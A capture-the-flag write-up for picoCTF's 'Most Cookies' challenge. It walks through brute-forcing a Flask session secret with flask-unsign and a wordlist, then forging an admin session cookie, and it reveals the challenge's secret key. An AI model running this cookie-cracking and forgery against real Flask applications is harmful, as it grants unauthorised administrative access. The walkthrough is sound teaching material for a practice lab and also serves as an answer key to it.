# [Most Cookies](https://play.picoctf.org/practice/challenge/177)

## Problem Statement
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
Additional details will be available after launching your challenge instance.

## Hint
1. How secure is a Flask cookie?

## Solution

### 1. Install the Cracking Tool

On Kali Linux, you need a tool that can read and "re-sign" Flask cookies:

```bash
pip3 install flask-unsign[wordlist] --break-system-packages
```

**Explanation:**
- `pip3` installs packages
- `flask-unsign` is the tool
- `[wordlist]` adds wordlist support
- `--break-system-packages` forces installation

### 2. Create the "Guessing" Wordlist

This is the most important part. The server needs a "secret key," and one of 28 specific cookie names is it. Create a wordlist by running:

```bash
nano wordlist.txt
```

Use this [wordlist.txt](script.py) script, which contains 28 cookie names and displays them.

### 3. Get Cookie Value

Go to the website, right-click, and select **Inspect → Application → Storage → Cookies**. You should see the cookie value. Copy it.

### 4. Find the Secret Key (Brute-Force)

The tool you installed will help with this step. You'll need the current cookie from your browser and the wordlist you created. The command will test every word until it finds the right one.

Run this command:

```bash
flask-unsign --unsign --cookie '(cookie value you got)' --wordlist wordlist.txt
```

The result will show the secret key for the website.

### 5. Forge the Admin Cookie

Now that you have the secret key, you can "sign" your own cookie, and the server will believe it is real.

Run this command:

```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'pinwheel'
```

The terminal will output a new long string. Copy it.

### 6. Replace the Cookie Value

Go to the website and select **Inspect → Application → Storage → Cookies**. Replace the cookie value with the new signed cookie you just created, then refresh the website. You should get the flag.
